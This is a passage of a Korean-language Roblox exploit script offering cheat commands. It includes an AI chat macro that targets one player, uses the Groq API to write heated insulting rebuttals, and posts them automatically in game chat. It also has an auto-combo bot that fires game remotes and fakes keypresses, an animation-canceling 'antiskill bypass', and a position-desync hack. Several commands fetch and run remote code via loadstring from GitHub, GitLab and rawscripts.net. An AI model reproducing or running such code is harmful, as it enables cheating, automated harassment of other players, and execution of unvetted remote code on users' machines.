말투\n\u{A0}\u{A0}\u{A0}- 필터에 잘 걸리는 강한 욕설\n\u{A0}\u{A0}\u{A0}- “노답”, “인정?”, “개소리” 같은 나이어린 표현\n현재 대화 맥락을 보고 상대의 말투, 주장, 감정 상태를 파악한 뒤,\n가장 자연스럽고 효과적인 키배 답변을 생성해라."

			if text4 ~= "" then
				str5 = v5 .. "\n\n[사용자 설정 상황]: " .. text4
			end

			local v6 = pickKeys(str5, tbl7)

			task.spawn(function()
				local tbl13 = key and { key } or tbl11

				task.delay(12, function()
					if flag8 then
						flag8 = false

						if flag6 then
							textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. text3 .. ")"
							textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)

							if #tbl10 > 0 then
								task.defer(processBatchedTargetMessages)
							end
						end
					end
				end)

				local str6 = "응답 요청 실패"
				local content = nil

				for _, v7 in ipairs(tbl13) do
					local tbl14 = { model = v7, messages = v6, temperature = 0.7, max_tokens = 600 }

					if v7:find("gpt-oss") then
						tbl14.reasoning_format = "hidden"
						tbl14.reasoning_effort = "low"
						tbl14.max_tokens = 600
					end

					local ok, result = pcall(function()
						return _httprequest({
							Url = "https://api.groq.com/openai/v1/chat/completions",
							Method = "POST",
							Headers = { Authorization = "Bearer " .. text, ["Content-Type"] = "application/json" },
							Body = HttpService_:JSONEncode(tbl14),
						})
					end)

					if ok and result then
						local statusCode = result.StatusCode or result.status_code or result.Status or 200
						local body = result.Body or result.body or ""

						local ok2, result2 = pcall(function()
							return HttpService_:JSONDecode(body)
						end)

						if ok2 and result2 then
							if result2.choices and result2.choices[1] and result2.choices[1].message then
								local message = result2.choices[1].message

								if message.content and message.content ~= "" then
									str3 = v7
									content = message.content
									break
								else
									content = nil
								end
							elseif result2.error and result2.error.message then
								str6 = tostring(result2.error.message)
								warn("[Groq API Error (" .. v7 .. ")]: " .. str6)
								content = nil
							else
								content = nil
							end
						elseif not ok2 then
							str6 = "HTTP " .. tostring(statusCode) .. " (" .. v7 .. ")"
							content = nil
						else
							content = nil
						end
					else
						str6 = "HTTP 요청 전송 실패"
						content = nil
					end
				end

				if content and content ~= "" then
					local str7 = content:gsub("<think>.-</think>", "")

					if str7:find("</think>") then
						str7 = str7:match("</think>%s*(.*)") or str7
					end

					if str7:find("<think>") then
						str7 = str7:gsub("<think>.*", "")
					end

					if not str7:match("[\234\235\236\237]") or str7:match("^%s*$") then
						local tbl14 = {}

						for match in content:gmatch("[^\n]+") do
							local str8 = match:gsub("^%s*(.-)%s*$", "%1")

							if not str8:find("<think") and not str8:find("</think") and not str8:match("^Here") and not str8:match("^%d+%s*%*%*") and not str8:match("^%*%*") and not str8:match("^[A-Za-z]") and (str8:match("\234") or str8:match("\235") or str8:match("\236") or str8:match("\237")) then
								table.insert(tbl14, str8)
							end
						end

						if #tbl14 > 0 then
							str7 = table.concat(tbl14, "\n")
						end
					end

					local str8 = str7:gsub("^%s*(.-)%s*$", "%1"):gsub("티민", "티밍")
					local match = str8:match("%[QUESTION:%s*(.-)%]")

					if match then
						textLabel5.Text = match
						textBox5.Text = ""
						frame5.Visible = true
						local connection3 = nil

						connection3 = textButton9.MouseButton1Click:Connect(function()
							local str9 = textBox5.Text:gsub("^%s*(.-)%s*$", "%1")

							if str9 ~= "" then
								frame5.Visible = false

								if connection3 then
									connection3:Disconnect()
								end

								table.insert(tbl7, { role = "user", content = "[사용자의 실제 확인 답변]: " .. str9 })
								flag8 = false
								safeGet2("상대에게 반박할 답변을 생성해라.")
							end
						end)

						return
					end

					table.insert(tbl7, { role = "assistant", content = str8 })

					if #tbl7 > 20 then
						table.remove(tbl7, 1)
						table.remove(tbl7, 1)
					end

					textLabel2.Text = "상태: AI 답변 발송 중 (" .. n .. "초 간격)"
					textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
					local serializedPayload = serializeList(str8)

					if #serializedPayload == 0 then
						flag8 = false

						if flag6 then
							textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. text3 .. ")"
							textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
						end

						return
					end

					local n3 = math.min(#serializedPayload, 3)

					for i = 1, n3 do
						local n4 = i == 1 and 0.2 or n * (i - 1)
						local v7 = serializedPayload[i]

						task.delay(n4, function()
							fn11("🤖 [AI]: " .. v7)

							task.spawn(function()
								pcall(function()
									game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(v7)
								end)
							end)
						end)
					end

					task.delay(n3 == 1 and 1 or n * (n3 - 1) + 1, function()
						flag8 = false

						if flag6 then
							textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. text3 .. ")"
							textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)

							if #tbl10 > 0 then
								task.defer(processBatchedTargetMessages)
							end
						end
					end)

					return
				end

				textLabel2.Text = "API 오류: " .. tostring(str6):sub(1, 40)
				textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
				fn9("Groq API 오류", tostring(str6))
				flag8 = false

				if #tbl10 > 0 then
					task.delay(2, processBatchedTargetMessages)
				end
			end)
		end

		textButton6.MouseButton1Click:Connect(function()
			if not _httprequest then
				fn9("오류", "HTTP Request 지원 불가")
				return
			end

			if not text or text == "" or #text < 10 then
				fn9("Groq API 키 필요", "UI 상단의 Groq API 키 입력창에 키를 넣어주세요.")
				return
			end

			if text3 == "" then
				fn9("상황 파악 오류", "타겟 닉네임을 먼저 지정해주세요.")
				return
			end
			local tbl12 = {}

			for _, v5 in ipairs(tbl9) do
				local v6 = string.lower(v5.speaker)
				local v7 = string.lower(text3)
				local v8 = string.lower(localPlayer2.Name)

				if v6 == v7 or v6:find(v7, 1, true) or v6 == v8 then
					table.insert(tbl12, v5.speaker .. ": " .. v5.text)
				end
			end

			if #tbl12 == 0 then
				fn9("상황 파악 안내", "타겟(" .. text3 .. ")과의 서버 대화 기록이 아직 없습니다.")
				return
			end
			textLabel2.Text = "상태: AI가 최근 대화를 분석하여 상황 파악 중..."
			textLabel2.TextColor3 = Color3.fromRGB(0, 200, 255)

			local str5 = [[다음은 로블록스 게임 내 타겟과 사용자의 최근 대화 기록이다.
이 대화 기록을 분석하여 현재 무슨 일로 싸우고 있는지(키배/티밍/억까/사기 등) 그 상황을 1~2문장으로 핵심만 요약해라.
만약 사용자에게 확인해야 할 주요 사실(증거 여부, 실제 핵/사기 여부 등)이 있다면 답변 첫 줄에 [QUESTION: 질문내용] 형태로 질문해라.

[대화 기록]:
]] .. table.concat(tbl12, "\n")

			task.spawn(function()
				local str6 = "응답 파싱 실패"
				local content = nil

				for _, v5 in ipairs(tbl11) do
					local ok, result = pcall(function()
						return _httprequest({
							Url = "https://api.groq.com/openai/v1/chat/completions",
							Method = "POST",
							Headers = { Authorization = "Bearer " .. text, ["Content-Type"] = "application/json" },
							Body = HttpService_:JSONEncode({
								model = v5,
								messages = { { role = "system", content = "너는 대화 맥락 분석 전문가 AI다." }, { role = "user", content = str5 } },
								temperature = 0.5,
								max_tokens = 150,
							}),
						})
					end)

					if ok and result then
						local body = result.Body or result.body or ""

						local ok2, result2 = pcall(function()
							return HttpService_:JSONDecode(body)
						end)

						if ok2 and result2 then
							if result2.choices and result2.choices[1] and result2.choices[1].message then
								str3 = v5
								content = result2.choices[1].message.content or ""
								break
							elseif result2.error and result2.error.message then
								str6 = tostring(result2.error.message)
								content = nil
							else
								content = nil
							end
						else
							content = nil
						end
					else
						content = nil
					end
				end

				if content then
					local v5 = content
					local match = v5:match("%[QUESTION:%s*(.-)%]")

					if match then
						textLabel5.Text = "AI가 상황 분석 중 질문: " .. match
						textBox5.Text = ""
						frame5.Visible = true
						local connection3 = nil

						connection3 = textButton9.MouseButton1Click:Connect(function()
							local str7 = textBox5.Text:gsub("^%s*(.-)%s*$", "%1")

							if str7 ~= "" then
								frame5.Visible = false

								if connection3 then
									connection3:Disconnect()
								end

								text4 = "상황: " .. v5:gsub("%[QUESTION:.-%]", "") .. " (사용자 확인: " .. str7 .. ")"
								textBox3.Text = text4
								textLabel2.Text = "상태: AI 자동 상황 파악 완료!"
								textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
								fn9("Groq AI", "자동 상황 파악 완료!")
							end
						end)

						return
					end

					text4 = v5:gsub("^%s*(.-)%s*$", "%1")
					textBox3.Text = text4
					textLabel2.Text = "상태: AI 자동 상황 파악 완료!"
					textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
					fn9("Groq AI", "자동 상황 파악 완료!\n" .. text4)
					return
				end

				textLabel2.Text = "상황 분석 오류: " .. tostring(str6):sub(1, 35)
				textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
			end)
		end)

		local function fn14()
			if not flag6 or flag8 then
				return
			end

			if #tbl10 == 0 then
				return
			end
			local str5 = table.concat(tbl10, " ")
			tbl10 = {}
			thread = nil

			if str5:find("증거") or str5:find("영상") or str5:find("사기") or str5:find("캡처") then
				if not frame5.Visible then
					textLabel5.Text = "'" .. tostring(text3) .. "' 님이 [" .. tostring(str5) .. "] 라고 주장합니다. 정말 사실인가요?"
					textBox5.Text = ""
					frame5.Visible = true
					local connection3 = nil

					connection3 = textButton9.MouseButton1Click:Connect(function()
						local str6 = textBox5.Text:gsub("^%s*(.-)%s*$", "%1")

						if str6 ~= "" then
							frame5.Visible = false

							if connection3 then
								connection3:Disconnect()
							end

							safeGet2(str5 .. " (나의 실제 답변: " .. str6 .. ")")
						end
					end)

					return
				end
			end

			safeGet2(str5)
		end

		local function safeGet3(tbl12, key)
			if not tbl12 or not key then
				return
			end
			local now = tick()
			local str5 = tostring(tbl12) .. ":" .. tostring(key)
			if str5 == str2 and now - n2 < 0.5 then
				return
			end
			str2 = str5
			n2 = now
			table.insert(tbl9, { speaker = tbl12, text = key, time = os.time() })

			if #tbl9 > 100 then
				table.remove(tbl9, 1)
			end

			if tbl12 == localPlayer2.Name then
				fn11("💬 [나]: " .. key)
				table.insert(tbl7, { role = "user", content = "[사용자(" .. localPlayer2.Name .. ")]: " .. key })

				if #tbl7 > 20 then
					table.remove(tbl7, 1)
				end

				local match = key:match("^;target%s+(.+)") or key:match("^/target%s+(.+)")

				if match then
					text3 = match:gsub("%s+", "")
					textBox2.Text = text3

					if flag6 then
						textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. text3 .. ")"
					end

					fn9("타겟 지정 완료", "새 타겟: " .. text3)
				end

				if string.lower(tostring(text3)) ~= string.lower(localPlayer2.Name) then
					return
				end
			end

			if text3 == "" then
				if not flag6 or tbl12 == localPlayer2.Name then
					return
				end
				text3 = tbl12

				if textBox2 then
					textBox2.Text = tbl12
				end

				textLabel2.Text = "상태: '" .. tbl12 .. "' 자동 타겟팅됨!"
				textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
			end

			local v5 = string.lower(tostring(tbl12))
			local v6 = string.lower(tostring(text3))
			local flag10

			if v5 == v6 or v5:find(v6, 1, true) then
				flag10 = true
			else
				local v7 = Players_3:FindFirstChild(tbl12)
				local displayName = v7 and v7.DisplayName
				flag10 = false

				if displayName then
					local v8 = string.lower(v7.DisplayName)

					if v8 == v6 or v8:find(v6, 1, true) then
						flag10 = true
					end
				end
			end

			if not flag10 then
				return
			end
			fn11("👤 [" .. tbl12 .. "]: " .. key)

			if not flag6 then
				textLabel2.Text = "타겟 감지됨! 시작 버튼을 ON으로 켜주세요."
				textLabel2.TextColor3 = Color3.fromRGB(255, 100, 100)
				return
			end

			table.insert(tbl10, key)

			if not flag8 then
				textLabel2.Text = "상태: 타겟 감지! 1.2초 후 답변 생성 (" .. #tbl10 .. "개)"
				textLabel2.TextColor3 = Color3.fromRGB(255, 200, 100)

				if thread then
					pcall(function()
						task.cancel(thread)
					end)

					thread = nil
				end

				thread = task.delay(1.2, function()
					fn14()
				end)
			else
				textLabel2.Text = "상태: 발송 중... (다음 답변 대기: " .. #tbl10 .. "개)"
			end
		end

		pcall(function()
			for _, player in ipairs(Players_3:GetPlayers()) do
				player.Chatted:Connect(function(message)
					safeGet3(player.Name, message)
				end)
			end
		end)

		Players_3.PlayerAdded:Connect(function(player)
			player.Chatted:Connect(function(message)
				safeGet3(player.Name, message)
			end)
		end)

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService then
				TextChatService.MessageReceived:Connect(function(arg)
					if not arg then
						return
					end

					pcall(function()
						local userId = arg.TextSource and arg.TextSource.UserId
						local str5 = ""

						if userId then
							local playerByUserId = Players_3:GetPlayerByUserId(arg.TextSource.UserId)

							if playerByUserId then
								str5 = playerByUserId.Name
							end
						end

						if (not str5 or str5 == "" or str5 == "TextSource") and arg.TextSource then
							local str6 = tostring(arg.TextSource.Name)

							if str6 ~= "TextSource" and str6 ~= "" then
								str5 = str6
							end
						end

						if (not str5 or str5 == "" or str5 == "TextSource") and arg.PrefixText then
							for _, player in ipairs(Players_3:GetPlayers()) do
								if arg.PrefixText:find(player.Name, 1, true) or arg.PrefixText:find(player.DisplayName, 1, true) then
									str5 = player.Name
									break
								end
							end
						end

						if str5 and str5 ~= "" and str5 ~= "TextSource" and arg.Text then
							safeGet3(str5, arg.Text)
						end
					end)
				end)
			end
		end)

		pcall(function()
			local defaultChatSystemChatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")

			if defaultChatSystemChatEvents then
				local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering")

				if onMessageDoneFiltering and onMessageDoneFiltering:IsA("RemoteEvent") then
					onMessageDoneFiltering.OnClientEvent:Connect(function(arg)
						if arg and arg.FromSpeaker and arg.Message then
							local _tostring = tostring
							local message = arg.Message
							safeGet3(tostring(arg.FromSpeaker), _tostring(message))
						end
					end)
				end
			end
		end)

		fn9("⚡ Groq AI 키배 매크로", "스크립트 로드 완료! (프리미엄 전용)\nJ 키를 누르거나 시작 버튼을 누르세요.")
	end)

	addcmd("autohitgui", { "ahg" }, function()
		local Players_3 = game:GetService("Players")
		local UserInputService_2 = game:GetService("UserInputService")
		local VirtualInputManager = game:GetService("VirtualInputManager")
		local Workspace = game:GetService("Workspace")
		local localPlayer2 = Players_3.LocalPlayer
		local currentCamera = Workspace.CurrentCamera
		local hui = nil

		pcall(function()
			if gethui then
				hui = gethui()
			elseif cloneref and typeof(cloneref) == "function" then
				hui = cloneref(game:GetService("CoreGui"))
			else
				hui = game:GetService("CoreGui")
			end
		end)

		hui = hui or localPlayer2:WaitForChild("PlayerGui")

		if hui:FindFirstChild("AutoComboUI") then
			pcall(function()
				hui.AutoComboUI:Destroy()
			end)
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "AutoComboUI"
		screenGui2.ResetOnSpawn = false
		screenGui2.DisplayOrder = 999
		screenGui2.Parent = hui
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 240, 0, 150)
		frame2.Position = UDim2.new(0.03, 0, 0.35, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		frame2.Parent = screenGui2
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 10)
		uiCorner3.Parent = frame2
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(60, 60, 75)
		uiStroke3.Thickness = 1.5
		uiStroke3.Parent = frame2
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "TitleLabel"
		textLabel.Size = UDim2.new(1, -40, 0, 35)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "Auto Combo"
		textLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
		textLabel.TextSize = 16
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame2
		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "CloseButton"
		textButton2.Size = UDim2.new(0, 28, 0, 28)
		textButton2.Position = UDim2.new(1, -33, 0, 4)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.TextSize = 14
		textButton2.Font = Enum.Font.SourceSansBold
		textButton2.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 6)
		uiCorner4.Parent = textButton2
		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, -20, 0, 1)
		frame3.Position = UDim2.new(0, 10, 0, 35)
		frame3.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		local textButton3 = Instance.new("TextButton")
		textButton3.Name = "ToggleButton"
		textButton3.Size = UDim2.new(1, -30, 0, 40)
		textButton3.Position = UDim2.new(0, 15, 0, 48)
		textButton3.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
		textButton3.Text = "오토 콤보 시작"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.TextSize = 15
		textButton3.Font = Enum.Font.SourceSansBold
		textButton3.Parent = frame2
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 8)
		uiCorner5.Parent = textButton3
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Name = "StatusLabel"
		textLabel2.Size = UDim2.new(1, -30, 0, 30)
		textLabel2.Position = UDim2.new(0, 15, 0, 100)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "상태: 중지됨"
		textLabel2.TextColor3 = Color3.fromRGB(160, 160, 175)
		textLabel2.TextSize = 13
		textLabel2.Font = Enum.Font.SourceSans
		textLabel2.Parent = frame2
		local flag5 = false
		local v5 = nil
		local position = nil
		local position2 = nil

		local function fn9(arg)
			local n = arg.Position - position
			frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
		end

		frame2.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = true
				position = input.Position
				position2 = frame2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag5 = false
					end
				end)
			end
		end)

		frame2.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v5 = input
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if input == v5 and flag5 then
				fn9(input)
			end
		end)

		local flag6 = false
		local tbl7 = { Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four }
		local n = 1

		local function getHwid5()
			local localPlayer3 = Players_3.LocalPlayer
			if not localPlayer3 then
				return nil
			end
			local character = localPlayer3.Character
			local live

			if character then
				live = character
			else
				live = Workspace:FindFirstChild("Live") and Workspace.Live:FindFirstChild(localPlayer3.Name)
			end

			if live and live:FindFirstChild("Communicate") then
				return live.Communicate
			end
			return nil
		end

		local function fn10()
			pcall(function()
				local hwid = getHwid5()

				if hwid then
					hwid:FireServer(unpack({
						{
							Goal = "LeftClick",
							MousePos = currentCamera and currentCamera.CFrame or CFrame.new(106.09854888916016, 441.80755615234375, 39.443000793457031, 0.77626323699951172, 0.43478929996490479, -0.4564797580242157, 0, 0.72410106658935547, 0.68969398736953735, 0.63040900230407715, -0.53538405895233154, 0.56209295988082886),
						},
					}))

					task.wait(0.02)
					hwid:FireServer(unpack({ { Goal = "LeftClickRelease" } }))
				end
			end)
		end

		local function fn11(arg, arg2)
			local value = arg.Value

			pcall(function()
				if keypress and keyrelease then
					if arg2 then
						keypress(value)
					else
						keyrelease(value)
					end
				end
			end)

			pcall(function()
				VirtualInputManager:SendKeyEvent(arg2, arg, false, game)
			end)
		end

		local function fn12()
			fn11(Enum.KeyCode.W, false)
			fn11(Enum.KeyCode.Q, false)
		end

		local function fn13()
			for i = 1, 4 do
				if not flag6 then
					return false
				end
				textLabel2.Text = "상태: 평타 " .. i .. "타 (0.3초)"
				fn10()
				task.wait(0.8)
			end

			return true
		end

		local function fn14()
			fn11(Enum.KeyCode.W, true)
			task.wait(0.03)
			fn11(Enum.KeyCode.Q, true)
			task.wait(0.05)
			fn11(Enum.KeyCode.Q, false)
			fn11(Enum.KeyCode.W, false)
		end

		local function fn15(arg)
			fn11(arg, true)
			task.wait(0.05)
			fn11(arg, false)
		end

		local function fn16()
			task.spawn(function()
				task.wait(0.3)

				while flag6 do
					local v6 = tbl7[n]

					if fn13() and flag6 then
						textLabel2.Text = "상태: 평타 완료 (0.5초 대기)"
						task.wait(0.5)

						if flag6 then
							textLabel2.Text = "상태: W+Q 대시!"
							fn14()
							textLabel2.Text = "상태: 대시 완료 (0.5초 대기)"
							task.wait(0.5)

							if flag6 then
								textLabel2.Text = "상태: " .. n .. "번 스킬 발동!"
								fn15(v6)
								textLabel2.Text = "상태: 스킬 완료 (0.5초 대기)"
								task.wait(0.5)
								if flag6 then
									n = n % #tbl7 + 1
									continue
								end
							end
						end
					end

					break
				end

				fn12()

				if screenGui2 and screenGui2.Parent then
					textLabel2.Text = "상태: 중지됨"
					textButton3.Text = "오토 콤보 시작"
					textButton3.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
				end
			end)
		end

		textButton3.MouseButton1Click:Connect(function()
			flag6 = not flag6

			if flag6 then
				textButton3.Text = "오토 콤보 중지"
				textButton3.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
				fn16()
			else
				textButton3.Text = "오토 콤보 시작"
				textButton3.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
				textLabel2.Text = "상태: 중지됨"
				fn12()
			end
		end)

		textButton2.MouseButton1Click:Connect(function()
			flag6 = false
			fn12()
			screenGui2:Destroy()
		end)

		wait(1)
		getgenv().delvape("autohitgui")
	end)

	addcmd("animationlogger", { "alogger" }, function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/IdkRandomUsernameok/PublicAssets/refs/heads/main/Releases/AnimationLogger.lua"))()
		wait(1)
		getgenv().delvape("animationlogger")
	end)

	addcmd("cobalt", { "rspy" }, function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-cobalt-rspy-bad-backup-246112"))()
		wait(1)
		getgenv().delvape("cobalt")
	end)

	addcmd("autoframgui", { "afgui" }, function()
		loadstring(game:HttpGet("https://gitlab.com/zkay404-group/ZHPE/-/raw/main/ZKPublicFarm"))()
		setclipboard("5TXWA-IQPTF-GCL21-V5TEJ")
		wait(1)
		getgenv().delvape("autoframgui")
	end)

	getgenv().NoAnimeEnabled = false
	local connection3 = nil
	local connection4 = nil
	local connection5 = nil
	local connection6 = nil

	local function fn9(arg)
		if not arg then
			return
		end
		local humanoid = arg:FindFirstChildOfClass("Humanoid")

		if humanoid then
			for _, v5 in pairs(humanoid:GetPlayingAnimationTracks()) do
				pcall(function()
					v5:Stop(0)
				end)
			end
		end

		local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")

		if animator then
			for _, v5 in pairs(animator:GetPlayingAnimationTracks()) do
				pcall(function()
					v5:Stop(0)
				end)
			end
		end
	end

	local function fn10(arg)
		if not arg then
			return
		end
		fn9(arg)

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 3)

		if humanoid then
			connection4 = humanoid.AnimationPlayed:Connect(function(arg2)
				if getgenv().NoAnimeEnabled then
					pcall(function()
						arg2:Stop(0)
					end)
				end
			end)

			local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 3)

			if animator then
				connection3 = animator.AnimationPlayed:Connect(function(arg2)
					if getgenv().NoAnimeEnabled then
						pcall(function()
							arg2:Stop(0)
						end)
					end
				end)
			end
		end
	end

	addcmd("bypassantiskill", { "noanim", "noanime" }, function()
		getgenv().NoAnimeEnabled = true

		if getgenv().addvape then
			getgenv().addvape("No Anim")
		end

		local localPlayer2 = Players_2.LocalPlayer

		if localPlayer2.Character then
			fn10(localPlayer2.Character)
		end

		if connection5 then
			connection5:Disconnect()
		end

		connection5 = RunService_2.Stepped:Connect(function()
			if getgenv().NoAnimeEnabled and localPlayer2.Character then
				fn9(localPlayer2.Character)
			end
		end)

		if connection6 then
			connection6:Disconnect()
		end

		connection6 = localPlayer2.CharacterAdded:Connect(function(character)
			if getgenv().NoAnimeEnabled then
				task.wait(0.2)
				fn10(character)
			end
		end)

		notify("No Anime", "모든 애니메이션 재생이 중지되었습니다 🚫", 2)
	end)

	addcmd("unbypassantiskill", { "unnoanim", "unnoanime", "unbypassantiskills" }, function()
		getgenv().NoAnimeEnabled = false

		if getgenv().delvape then
			getgenv().delvape("No Anim")
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		if connection5 then
			connection5:Disconnect()
			connection5 = nil
		end

		if connection6 then
			connection6:Disconnect()
			connection6 = nil
		end

		notify("No Anime", "애니메이션 재생 중지가 해제되었습니다 ⭕", 2)
	end)

	addcmd("fakepos", { "desync" }, function()
		local _cloneref = cloneref or function(arg)
			return arg
		end

		local v5 = _cloneref(game:GetService("Players"))
		local v6 = _cloneref(game:GetService("RunService"))
		local v7 = _cloneref(game:GetService("CoreGui"))
		local v8 = _cloneref(game:GetService("UserInputService"))
		local v9 = _cloneref(v5.LocalPlayer)

		pcall(function()
			setfflag("S2PhysicsSenderRate", "25000000")
		end)

		local flag5 = false
		local connection7 = nil
		local thread = nil

		local function getGlobal2()
			local character = v9.Character
			if not character then
				return nil
			end
			return character:FindFirstChild("PhysicsRootPart") or character:FindFirstChild("HumanoidRootPart")
		end

		local function fn11()
			if connection7 then
				return
			end

			connection7 = v6.Heartbeat:Connect(function()
				local v10 = getGlobal2()
				if not v10 then
					return
				end

				pcall(function()
					sethiddenproperty(v10, "NetworkIsSleeping", false)
					setPhysicsRep(v10, v10)
				end)
			end)
		end

		local function fn12()
			if connection7 then
				connection7:Disconnect()
				connection7 = nil
			end

			local v10 = getGlobal2()

			if v10 then
				setPhysicsRep(v10, nil)
			end
		end

		local function fn13()
			if flag5 then
				return
			end
			flag5 = true
			getgenv().fakepos_enabled = true

			thread = task.spawn(function()
				while flag5 do
					if getgenv().fakepos_pause then
						fn12()

						while getgenv().fakepos_pause and flag5 do
							task.wait(0.05)
						end

						if flag5 then
							fn11()
							task.wait(0.1)

							if flag5 then
								fn12()
								task.wait(0.1)
								continue
							end
						end
					else
						fn11()
						task.wait(0.1)

						if flag5 then
							fn12()
							task.wait(0.1)
							continue
						end
					end

					break
				end

				fn12()
				getgenv().fakepos_enabled = false
			end)
		end

		local function fn14()
			flag5 = false
			getgenv().fakepos_enabled = false
			getgenv().fakepos_pause = false
			fn12()

			if thread then
				task.cancel(thread)
				thread = nil
			end

			if getgenv().delvape then
				getgenv().delvape("fakepos")
				getgenv().delvape("desync")
			end
		end

		local function fn15()
			pcall(function()
				local xgui = v7:FindFirstChild("xgui")

				if xgui then
					xgui:Destroy()
				end
			end)

			local screenGui2 = Instance.new("ScreenGui")
			screenGui2.Name = "xgui"
			screenGui2.ResetOnSpawn = false
			screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui2.Parent = v7
			local frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(0, 180, 0, 60)
			frame2.Position = UDim2.new(0.5, -90, 0.85, 0)
			frame2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
			frame2.BorderSizePixel = 0
			frame2.Parent = screenGui2
			local uiCorner3 = Instance.new("UICorner")
			uiCorner3.CornerRadius = UDim.new(0, 8)
			uiCorner3.Parent = frame2
			local uiStroke3 = Instance.new("UIStroke")
			uiStroke3.Color = Color3.fromRGB(60, 60, 60)
			uiStroke3.Thickness = 1.5
			uiStroke3.Parent = frame2
			local textButton2 = Instance.new("TextButton")
			textButton2.Size = UDim2.new(0, 20, 0, 20)
			textButton2.Position = UDim2.new(1, -24, 0, 4)
			textButton2.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
			textButton2.BorderSizePixel = 0
			textButton2.Text = "X"
			textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton2.Font = Enum.Font.GothamBold
			textButton2.TextSize = 12
			textButton2.Parent = frame2
			local uiCorner4 = Instance.new("UICorner")
			uiCorner4.CornerRadius = UDim.new(0, 4)
			uiCorner4.Parent = textButton2
			local textButton3 = Instance.new("TextButton")
			textButton3.Size = UDim2.new(1, -16, 1, -30)
			textButton3.Position = UDim2.new(0, 8, 0, 24)
			textButton3.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
			textButton3.BorderSizePixel = 0
			textButton3.Text = "LOOP: OFF"
			textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton3.Font = Enum.Font.GothamBold
			textButton3.TextSize = 13
			textButton3.Parent = frame2
			local uiCorner5 = Instance.new("UICorner")
			uiCorner5.CornerRadius = UDim.new(0, 6)
			uiCorner5.Parent = textButton3
			local flag6 = false
			local position = nil
			local position2 = nil

			frame2.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					flag6 = true
					position = input.Position
					position2 = frame2.Position
				end
			end)

			frame2.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					flag6 = false
				end
			end)

			v8.InputChanged:Connect(function(input)
				local flag7 = flag6

				if flag6 then
